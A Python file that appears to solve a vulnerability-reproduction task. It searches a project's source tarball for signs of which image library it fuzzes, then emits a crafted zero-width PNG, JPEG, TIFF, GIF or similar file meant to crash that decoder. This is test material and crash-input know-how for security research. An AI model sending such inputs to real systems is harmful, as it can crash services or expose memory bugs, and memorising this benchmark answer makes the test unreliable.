import os
import re
import tarfile
import zlib
from dataclasses import dataclass
from typing import Dict, List, Optional, Tuple


@dataclass
class _Analysis:
    scores: Dict[str, int]
    best_samples: Dict[str, bytes]


class Solution:
    _TEXT_EXTS = {
        ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx",
        ".cmake", "cmakelists.txt",
        ".gn", ".gni", ".mk", ".in", ".inc",
        ".py", ".rs", ".go", ".java", ".js", ".ts",
        ".md", ".rst", ".txt",
        ".yml", ".yaml", ".json", ".toml",
        ".bazel", ".bzl", ".build",
        ".sh",
    }

    _FORMAT_KEYWORDS = {
        "png": [
            ("libpng", 12), ("png_read", 8), ("png_", 5), ("ihdr", 7), ("idat", 5),
            ("spng", 10), ("lodepng", 10), ("apng", 6),
        ],
        "jpeg": [
            ("jpeglib", 12), ("libjpeg", 10), ("jpeg_", 6), ("tjdecompress", 10),
            ("jxl", 2), ("jfif", 4), ("soi", 2), ("sof", 3),
        ],
        "tiff": [
            ("libtiff", 12), ("tiff", 6), ("tiffopen", 10), ("tiffread", 10),
            ("bigtiff", 7),
        ],
        "gif": [
            ("gif", 6), ("dgif", 10), ("egif", 10), ("giflib", 12),
        ],
        "bmp": [
            ("bmp", 6), ("bitmap", 7), ("dib", 3),
        ],
        "tga": [
            ("tga", 8), ("targa", 10),
        ],
        "pnm": [
            ("pnm", 8), ("ppm", 8), ("pgm", 8), ("pbm", 8), ("portable anymap", 12),
        ],
        "webp": [
            ("webp", 10), ("vp8", 6), ("vp8l", 6), ("vp8x", 6),
        ],
        "jp2": [
            ("jp2", 10), ("jpeg2000", 10), ("openjpeg", 12), ("j2k", 8), ("jp2k", 8),
        ],
        "avif": [
            ("avif", 12), ("heif", 8), ("ispe", 6), ("isobmff", 6),
            ("libheif", 12), ("libavif", 12),
        ],
        "svg": [
            ("svg", 10), ("librsvg", 12), ("xml", 2),
        ],
    }

    _SAMPLE_EXT_TO_FORMAT = {
        ".png": "png",
        ".jpg": "jpeg",
        ".jpeg": "jpeg",
        ".jpe": "jpeg",
        ".tif": "tiff",
        ".tiff": "tiff",
        ".gif": "gif",
        ".bmp": "bmp",
        ".tga": "tga",
        ".pnm": "pnm",
        ".ppm": "pnm",
        ".pgm": "pnm",
        ".pbm": "pnm",
        ".webp": "webp",
        ".jp2": "jp2",
        ".j2k": "jp2",
        ".jpf": "jp2",
        ".jpx": "jp2",
        ".avif": "avif",
        ".heic": "avif",
        ".heif": "avif",
        ".hif": "avif",
        ".svg": "svg",
    }

    def solve(self, src_path: str) -> bytes:
        try:
            with tarfile.open(src_path, "r:*") as tf:
                analysis = self._analyze_tar(tf)
        except Exception:
            return self._gen_minimal("png")

        fmt = self._choose_format(analysis)

        sample = analysis.best_samples.get(fmt)
        if sample is not None:
            patched = self._patch_to_zero_dim(fmt, sample)
            if patched is not None:
                return patched

        return self._gen_minimal(fmt)

    def _analyze_tar(self, tf: tarfile.TarFile) -> _Analysis:
        scores: Dict[str, int] = {k: 0 for k in self._FORMAT_KEYWORDS.keys()}
        best_samples: Dict[str, bytes] = {}

        max_text = 512 * 1024
        max_sample = 512 * 1024

        for m in tf:
            if not m.isfile() or m.size <= 0:
                continue

            name = m.name
            lname = name.lower()
            ext = os.path.splitext(lname)[1]

            is_text = (lname in self._TEXT_EXTS) or (ext in self._TEXT_EXTS)
            sample_fmt = self._SAMPLE_EXT_TO_FORMAT.get(ext)

            if is_text and m.size <= max_text:
                data = self._read_member(tf, m, max_text)
                if data:
                    try:
                        text = data.decode("utf-8", errors="ignore").lower()
                    except Exception:
                        text = ""

                    if text:
                        weight = 1
                        if "llvmfuzzertestoneinput" in text or "fuzzer" in lname or "fuzz" in lname:
                            weight = 6
                        if "width" in text and "height" in text:
                            weight += 1

                        for f, kws in self._FORMAT_KEYWORDS.items():
                            s = 0
                            for kw, w in kws:
                                if kw in text:
                                    c = text.count(kw)
                                    if c > 3:
                                        c = 3
                                    s += w * c
                            if s:
                                scores[f] += s * weight

                        for f, kws in self._FORMAT_KEYWORDS.items():
                            for kw, w in kws:
                                if kw in lname:
                                    scores[f] += max(1, w // 3)
            if sample_fmt and m.size <= max_sample:
                head = self._read_member(tf, m, 64)
                if not head:
                    continue
                if not self._magic_ok(sample_fmt, head):
                    continue
                cur = best_samples.get(sample_fmt)
                if cur is None or len(cur) > m.size:
                    full = self._read_member(tf, m, int(m.size))
                    if full and self._magic_ok(sample_fmt, full[:64]):
                        best_samples[sample_fmt] = full
                        scores[sample_fmt] += 50

        return _Analysis(scores=scores, best_samples=best_samples)

    def _read_member(self, tf: tarfile.TarFile, m: tarfile.TarInfo, n: int) -> bytes:
        try:
            f = tf.extractfile(m)
            if f is None:
                return b""
            with f:
                return f.read(n)
        except Exception:
            return b""

    def _choose_format(self, analysis: _Analysis) -> str:
        scores = analysis.scores
        best_fmt = "png"
        best_score = -1
        for f, s in scores.items():
            if s > best_score:
                best_score = s
                best_fmt = f
        if best_score <= 0 and analysis.best_samples:
            best_fmt = min(analysis.best_samples.items(), key=lambda kv: len(kv[1]))[0]
        return best_fmt

    def _magic_ok(self, fmt: str, head: bytes) -> bool:
        if fmt == "png":
            return head.startswith(b"\x89PNG\r\n\x1a\n")
        if fmt == "gif":
            return head.startswith(b"GIF87a") or head.startswith(b"GIF89a")
        if fmt == "bmp":
            return head.startswith(b"BM")
        if fmt == "jpeg":
            return len(head) >= 2 and head[0] == 0xFF and head[1] == 0xD8
        if fmt == "tiff":
            return head.startswith(b"II*\x00") or head.startswith(b"MM\x00*")
        if fmt == "webp":
            return len(head) >= 12 and head[0:4] == b"RIFF" and head[8:12] == b"WEBP"
        if fmt == "jp2":
            return head.startswith(b"\x00\x00\x00\x0cjP  \r\n\x87\n") or (b"jp2" in head[:32] and head[:4] in (b"\x00\x00\x00\x0c",))
        if fmt == "avif":
            if len(head) < 16:
                return False
            if head[4:8] != b"ftyp":
                return False
            brands = head[8:16]
            return (b"avif" in brands) or (b"heic" in brands) or (b"heif" in brands) or (b"mif1" in brands)
        if fmt == "tga":
            return len(head) >= 18
        if fmt == "pnm":
            return head.startswith(b"P1") or head.startswith(b"P2") or head.startswith(b"P3") or head.startswith(b"P4") or head.startswith(b"P5") or head.startswith(b"P6")
        if fmt == "svg":
            h = head.lstrip()
            return h.startswith(b"<svg") or h.startswith(b"<?xml") or b"<svg" in h[:128].lower()
        return False

    def _patch_to_zero_dim(self, fmt: str, data: bytes) -> Optional[bytes]:
        try:
            if fmt == "png":
                return self._patch_png(data)
            if fmt == "gif":
                return self._patch_gif(data)
            if fmt == "bmp":
                return self._patch_bmp(data)
            if fmt == "jpeg":
                return self._patch_jpeg(data)
            if fmt == "tiff":
                return self._patch_tiff(data)
            if fmt == "jp2":
                return self._patch_jp2(data)
            if fmt == "avif":
                return self._patch_isobmff_ispe(data)
            if fmt == "svg":
                return self._patch_svg(data)
            if fmt == "tga":
                return self._patch_tga(data)
            if fmt == "pnm":
                return self._patch_pnm(data)
        except Exception:
            return None
        return None

    def _patch_png(self, data: bytes) -> Optional[bytes]:
        if not data.startswith(b"\x89PNG\r\n\x1a\n"):
            return None
        b = bytearray(data)
        i = 8
        n = len(b)
        while i + 12 <= n:
            length = int.from_bytes(b[i:i + 4], "big", signed=False)
            ctype = bytes(b[i + 4:i + 8])
            if length < 0 or i + 12 + length > n:
                break
            if ctype == b"IHDR" and length >= 13:
                w_off = i + 8
                b[w_off:w_off + 4] = (0).to_bytes(4, "big", signed=False)
                crc_off = i + 8 + length
                chunk_crc = zlib.crc32(ctype)
                chunk_crc = zlib.crc32(b[i + 8:i + 8 + length], chunk_crc) & 0xFFFFFFFF
                b[crc_off:crc_off + 4] = chunk_crc.to_bytes(4, "big", signed=False)
                return bytes(b)
            i = i + 12 + length
        return None

    def _patch_gif(self, data: bytes) -> Optional[bytes]:
        if not (data.startswith(b"GIF87a") or data.startswith(b"GIF89a")):
            return None
        if len(data) < 10:
            return None
        b = bytearray(data)
        b[6:8] = b"\x00\x00"
        return bytes(b)

    def _patch_bmp(self, data: bytes) -> Optional[bytes]:
        if not data.startswith(b"BM"):
            return None
        if len(data) < 26:
            return None
        b = bytearray(data)
        if len(b) >= 22:
            b[18:22] = (0).to_bytes(4, "little", signed=True)
        return bytes(b)

    def _patch_jpeg(self, data: bytes) -> Optional[bytes]:
        if len(data) < 4 or not (data[0] == 0xFF and data[1] == 0xD8):
            return None
        b = bytearray(data)
        i = 2
        n = len(b)
        while i + 4 <= n:
            if b[i] != 0xFF:
                i += 1
                continue
            j = i
            while j < n and b[j] == 0xFF:
                j += 1
            if j >= n:
                break
            marker = b[j]
            i = j + 1
            if marker in (0xD8, 0xD9):
                continue
            if marker == 0xDA:
                break
            if i + 2 > n:
                break
            seglen = int.from_bytes(b[i:i + 2], "big", signed=False)
            if seglen < 2 or i + seglen > n:
                break
            if 0xC0 <= marker <= 0xCF and marker not in (0xC4, 0xC8, 0xCC):
                # SOF: precision(1), height(2), width(2)
                sof = i + 2
                if sof + 5 <= n:
                    w_off = sof + 3
                    b[w_off:w_off + 2] = (0).to_bytes(2, "big", signed=False)
                    return bytes(b)
            i = i + seglen
        return None

    def _patch_tiff(self, data: bytes) -> Optional[bytes]:
        if len(data) < 8:
            return None
        b = bytearray(data)
        if b[0:2] == b"II":
            endian = "little"
        elif b[0:2] == b"MM":
            endian = "big"
        else:
            return None
        if int.from_bytes(b[2:4], endian, signed=False) != 42:
            return None
        ifd_off = int.from_bytes(b[4:8], endian, signed=False)
        if ifd_off + 2 > len(b):
            return None
        num = int.from_bytes(b[ifd_off:ifd_off + 2], endian, signed=False)
        ent_off = ifd_off + 2
        for _ in range(num):
            if ent_off + 12 > len(b):
                break
            tag = int.from_bytes(b[ent_off:ent_off + 2], endian, signed=False)
            typ = int.from_bytes(b[ent_off + 2:ent_off + 4], endian, signed=False)
            cnt = int.from_bytes(b[ent_off + 4:ent_off + 8], endian, signed=False)
            valoff = ent_off + 8

            if tag == 256:  # ImageWidth
                self._tiff_write_value(b, endian, typ, cnt, valoff, 0)
                return bytes(b)

            ent_off += 12
        return None

    def _tiff_write_value(self, b: bytearray, endian: str, typ: int, cnt: int, valoff: int, value: int) -> None:
        type_size = {1: 1, 2: 1, 3: 2, 4: 4, 5: 8, 6: 1, 7: 1, 8: 2, 9: 4, 10: 8, 11: 4, 12: 8}.get(typ, 0)
        total = type_size * cnt if type_size else 0
        if total <= 0:
            return

        def write_at(off: int, nbytes: int) -> None:
            if off < 0 or off + nbytes > len(b):
                return
            if nbytes == 2:
                b[off:off + 2] = int(value).to_bytes(2, endian, signed=False)
            elif nbytes == 4:
                b[off:off + 4] = int(value).to_bytes(4, endian, signed=False)
            elif nbytes == 1:
                b[off:off + 1] = bytes([value & 0xFF])
            else:
                b[off:off + nbytes] = (int(value).to_bytes(nbytes, endian, signed=False))

        if total <= 4:
            if typ in (3, 8):
                write_at(valoff, 2)
            elif typ in (4, 9):
                write_at(valoff, 4)
            elif typ in (1, 2, 6, 7):
                write_at(valoff, 1)
            else:
                write_at(valoff, min(4, total))
        else:
            data_off = int.from_bytes(b[valoff:valoff + 4], endian, signed=False)
            if typ in (3, 8):
                write_at(data_off, 2)
            elif typ in (4, 9):
                write_at(data_off, 4)
            elif typ in (1, 2, 6, 7):
                write_at(data_off, 1)
            else:
                write_at(data_off, type_size)

    def _patch_jp2(self, data: bytes) -> Optional[bytes]:
        b = bytearray(data)
        n = len(b)

        def parse_region(start: int, end: int) -> Optional[Tuple[int, int]]:
            off = start
            while off + 8 <= end:
                size = int.from_bytes(b[off:off + 4], "big", signed=False)
                typ = bytes(b[off + 4:off + 8])
                header = 8
                if size == 1:
                    if off + 16 > end:
                        return None
                    size = int.from_bytes(b[off + 8:off + 16], "big", signed=False)
                    header = 16
                elif size == 0:
                    size = end - off
                if size < header or off + size > end:
                    return None
                payload_off = off + header
                payload_end = off + size

                if typ == b"ihdr" and payload_off + 8 <= payload_end:
                    # ihdr: height (4), width (4)
                    b[payload_off + 4:payload_off + 8] = (0).to_bytes(4, "big", signed=False)
                    return (off, size)

                if typ in (b"jp2h", b"res ", b"uinf", b"asoc"):
                    r = parse_region(payload_off, payload_end)
                    if r is not None:
                        return r

                off += size
            return None

        r = parse_region(0, n)
        if r is None:
            return None
        return bytes(b)

    def _patch_isobmff_ispe(self, data: bytes) -> Optional[bytes]:
        b = bytearray(data)
        n = len(b)

        container_types = {
            b"moov", b"trak", b"mdia", b"minf", b"stbl", b"edts", b"dinf", b"mvex",
            b"meta", b"iprp", b"ipco", b"ipma", b"iinf", b"iloc", b"iref", b"pitm",
            b"udta", b"mfra", b"skip",
        }

        def parse_boxes(start: int, end: int, depth: int = 0) -> Optional[int]:
            if depth > 64:
                return None
            off = start
            while off + 8 <= end:
                size = int.from_bytes(b[off:off + 4], "big", signed=False)
                typ = bytes(b[off + 4:off + 8])
                header = 8
                if size == 1:
                    if off + 16 > end:
                        return None
                    size = int.from_bytes(b[off + 8:off + 16], "big", signed=False)
                    header = 16
                elif size == 0:
                    size = end - off
                if size < header or off + size > end:
                    return None

                payload_off = off + header
                payload_end = off + size

                if typ == b"ispe":
                    # full box: version/flags (4), width (4), height (4)
                    if payload_off + 12 <= payload_end:
                        b[payload_off + 4:payload_off + 8] = (0).to_bytes(4, "big", signed=False)
                        return payload_off + 4

                if typ == b"meta":
                    # full box: version/flags then children
                    if payload_off + 4 <= payload_end:
                        r = parse_boxes(payload_off + 4, payload_end, depth + 1)
                        if r is not None:
                            return r
                elif typ in container_types:
                    r = parse_boxes(payload_off, payload_end, depth + 1)
                    if r is not None:
                        return r

                off += size
            return None

        r = parse_boxes(0, n)
        if r is None:
            return None
        return bytes(b)

    def _patch_svg(self, data: bytes) -> Optional[bytes]:
        try:
            s = data.decode("utf-8", errors="ignore")
        except Exception:
            return None
        s2 = re.sub(r'width\s*=\s*("|\')([0-9]+(\.[0-9]+)?)("|\')', r'width="0"', s, flags=re.IGNORECASE)
        if s2 == s:
            s2 = re.sub(r'<svg\b', '<svg width="0" height="1"', s, count=1, flags=re.IGNORECASE)
        if s2 == s:
            return None
        return s2.encode("utf-8", errors="ignore")

    def _patch_tga(self, data: bytes) -> Optional[bytes]:
        if len(data) < 18:
            return None
        b = bytearray(data)
        # width at bytes 12-13, height at 14-15 (little-endian)
        b[12:14] = b"\x00\x00"
        return bytes(b)

    def _patch_pnm(self, data: bytes) -> Optional[bytes]:
        # Patch the first width token to 0 (best-effort)
        try:
            s = data.decode("ascii", errors="ignore")
        except Exception:
            return None
        if not s.startswith("P"):
            return None
        # Tokenize preserving whitespace
        parts = re.split(r"(\s+|#.*?\n)", s)
        tokens = []
        idxs = []
        acc = ""
        pos = 0
        for i, p in enumerate(parts):
            if not p:
                continue
            if re.match(r"\s+|#.*?\n", p):
                pos += len(p)
                continue
            # Split non-whitespace chunks further by whitespace? already separated; keep as token
            tokens.append((p, pos, pos + len(p)))
            idxs.append(i)
            pos += len(p)
        if not tokens:
            return None
        # Expect: P6, width, height, maxval ...
        if len(tokens) < 3:
            return None
        # Replace width token (index 1) with "0"
        t, a, c = tokens[1]
        if t == "0":
            return None
        out = bytearray(data)
        # Only safe if same length; otherwise just generate minimal
        if len(t) != 1:
            return None
        out[a:c] = b"0"
        return bytes(out)

    def _gen_minimal(self, fmt: str) -> bytes:
        if fmt == "png":
            return self._gen_png()
        if fmt == "gif":
            return self._gen_gif()
        if fmt == "bmp":
            return self._gen_bmp()
        if fmt == "jpeg":
            return self._gen_jpeg(width=0, height=1)
        if fmt == "tiff":
            return self._gen_tiff()
        if fmt == "tga":
            return self._gen_tga()
        if fmt == "pnm":
            return self._gen_pnm()
        if fmt == "svg":
            return self._gen_svg()
        # For complex formats, fallback to PNG.
        return self._gen_png()

    def _png_chunk(self, ctype: bytes, payload: bytes) -> bytes:
        ln = len(payload).to_bytes(4, "big", signed=False)
        crc = zlib.crc32(ctype)
        crc = zlib.crc32(payload, crc) & 0xFFFFFFFF
        return ln + ctype + payload + crc.to_bytes(4, "big", signed=False)

    def _gen_png(self) -> bytes:
        sig = b"\x89PNG\r\n\x1a\n"
        ihdr = (
            (0).to_bytes(4, "big") +
            (1).to_bytes(4, "big") +
            bytes([8, 2, 0, 0, 0])
        )
        # One scanline: filter byte only
        idat_raw = b"\x00"
        idat = zlib.compress(idat_raw, level=9)
        return sig + self._png_chunk(b"IHDR", ihdr) + self._png_chunk(b"IDAT", idat) + self._png_chunk(b"IEND", b"")

    def _gen_gif(self) -> bytes:
        # Minimal GIF with logical screen width = 0, height = 1
        header = b"GIF89a"
        lsd = (0).to_bytes(2, "little") + (1).to_bytes(2, "little") + bytes([0xF0, 0x00, 0x00])
        gct = b"\x00\x00\x00\xff\xff\xff"
        img_desc = b"\x2c" + b"\x00\x00\x00\x00" + (0).to_bytes(2, "little") + (1).to_bytes(2, "little") + b"\x00"
        # LZW min code size 2, using tiny custom stream (may be ignored)
        img_data = b"\x02" + b"\x02" + b"\x4c\x01" + b"\x00"
        trailer = b"\x3b"
        return header + lsd + gct + img_desc + img_data + trailer

    def _gen_bmp(self) -> bytes:
        # BMP with width=0, height=1, 24bpp, with small pixel data to encourage processing
        pixel = b"\x00\x00\x00\x00"
        off_bits = 14 + 40
        file_size = off_bits + len(pixel)
        bf = b"BM" + file_size.to_bytes(4, "little") + b"\x00\x00\x00\x00" + off_bits.to_bytes(4, "little")
        bi = (
            (40).to_bytes(4, "little") +
            (0).to_bytes(4, "little", signed=True) +
            (1).to_bytes(4, "little", signed=True) +
            (1).to_bytes(2, "little") +
            (24).to_bytes(2, "little") +
            (0).to_bytes(4, "little") +
            (0).to_bytes(4, "little") +
            (0).to_bytes(4, "little", signed=True) +
            (0).to_bytes(4, "little", signed=True) +
            (0).to_bytes(4, "little") +
            (0).to_bytes(4, "little")
        )
        return bf + bi + pixel

    def _gen_tiff(self) -> bytes:
        # Little-endian TIFF with ImageWidth=0, ImageLength=1, uncompressed RGB, with a tiny strip payload
        endian = b"II"
        magic = (42).to_bytes(2, "little")
        ifd_off = (8).to_bytes(4, "little")
        header = endian + magic + ifd_off

        entries = []
        # Helper to build entry: tag, type, count, value_or_offset
        def ent(tag: int, typ: int, cnt: int, val: int) -> bytes:
            return (
                tag.to_bytes(2, "little") +
                typ.to_bytes(2, "little") +
                cnt.to_bytes(4, "little") +
                val.to_bytes(4, "little")
            )

        # Layout:
        # header (8)
        # IFD: count(2) + 9*12 + next(4) = 114 bytes, starts at 8 => ends at 122
        ifd_start = 8
        ifd_size = 2 + 9 * 12 + 4
        bits_offset = ifd_start + ifd_size  # 122
        pixel_offset = (bits_offset + 6 + 1) & ~1  # align to even, typically 128
        if pixel_offset < bits_offset + 6:
            pixel_offset = bits_offset + 6

        entries.append(ent(256, 4, 1, 0))             # ImageWidth LONG 0
        entries.append(ent(257, 4, 1, 1))             # ImageLength LONG 1
        entries.append(ent(258, 3, 3, bits_offset))   # BitsPerSample SHORT[3]
        entries.append(ent(259, 3, 1, 1))             # Compression = 1
        entries.append(ent(262, 3, 1, 2))             # Photometric = RGB
        entries.append(ent(273, 4, 1, pixel_offset))  # StripOffsets
        entries.append(ent(277, 3, 1, 3))             # SamplesPerPixel = 3
        entries.append(ent(278, 4, 1, 1))             # RowsPerStrip = 1
        entries.append(ent(279, 4, 1, 3))             # StripByteCounts = 3 (despite width=0)

        ifd = (len(entries)).to_bytes(2, "little") + b"".join(entries) + (0).to_bytes(4, "little")

        bits = (8).to_bytes(2, "little") + (8).to_bytes(2, "little") + (8).to_bytes(2, "little")
        pad = b"\x00" * max(0, pixel_offset - (bits_offset + len(bits)))
        pixel = b"\x00\x00\x00"
        return header + ifd + bits + pad + pixel

    def _gen_tga(self) -> bytes:
        # Uncompressed true-color TGA with width=0 height=1, 24bpp, plus one pixel
        hdr = bytearray(18)
        hdr[0] = 0  # id length
        hdr[1] = 0  # color map type
        hdr[2] = 2  # image type: uncompressed true-color
        # color map spec: zeros
        # x_origin,y_origin: zeros
        hdr[12:14] = (0).to_bytes(2, "little")
        hdr[14:16] = (1).to_bytes(2, "little")
        hdr[16] = 24
        hdr[17] = 0
        return bytes(hdr) + b"\x00\x00\x00"

    def _gen_pnm(self) -> bytes:
        # P6 with width=0 height=1 and a stray pixel byte triplet
        return b"P6\n0 1\n255\n" + b"\x00\x00\x00"

    def _gen_svg(self) -> bytes:
        return (b'<?xml version="1.0" encoding="UTF-8"?>\n'
                b'<svg xmlns="http://www.w3.org/2000/svg" width="0" height="1">'
                b'<rect x="0" y="0" width="1" height="1" fill="black"/></svg>\n')

    def _gen_jpeg(self, width: int, height: int) -> bytes:
        # Minimal baseline JPEG with custom tiny Huffman tables that can decode all-zero blocks.
        # Uses one quant table (all 1s), one DC table (symbol 0), one AC table (symbol 0x00 EOB).
        def seg(marker: int, payload: bytes) -> bytes:
            return bytes([0xFF, marker]) + (len(payload) + 2).to_bytes(2, "big") + payload

        soi = b"\xFF\xD8"
        eoi = b"\xFF\xD9"

        # DQT: Pq=0, Tq=0, 64 bytes = 1
        dqt = seg(0xDB, b"\x00" + (b"\x01" * 64))

        # SOF0: precision 8, height, width, 3 components, all use qt 0
        sof = (
            b"\x08" +
            int(height & 0xFFFF).to_bytes(2, "big") +
            int(width & 0xFFFF).to_bytes(2, "big") +
            b"\x03" +
            b"\x01\x11\x00" +  # Y
            b"\x02\x11\x00" +  # Cb
            b"\x03\x11\x00"    # Cr
        )
        sof0 = seg(0xC0, sof)

        # DHT: DC table 0 with one symbol (0), AC table 0 with one symbol (0x00 EOB)
        # bits: 16 counts. Put 1 code of length 1.
        bits_len1 = bytes([1] + [0] * 15)
        dht_dc0 = b"\x00" + bits_len1 + b"\x00"
        dht_ac0 = b"\x10" + bits_len1 + b"\x00"
        dht = seg(0xC4, dht_dc0 + dht_ac0)

        # SOS: 3 comps, each uses DC=0 AC=0, Ss=0 Se=63 AhAl=0
        sos_hdr = (
            b"\x03" +
            b"\x01\x00" +
            b"\x02\x00" +
            b"\x03\x00" +
            b"\x00\x3F\x00"
        )
        sos = seg(0xDA, sos_hdr)

        # Scan data: for each of 3 blocks: DC symbol(0) => '0', AC EOB => '0' => 2 bits per block.
        # Total 6 bits -> pad with 1s to full byte: '00000011' = 0x03
        scan = b"\x03"

        return soi + dqt + sof0 + dht + sos + scan + eoi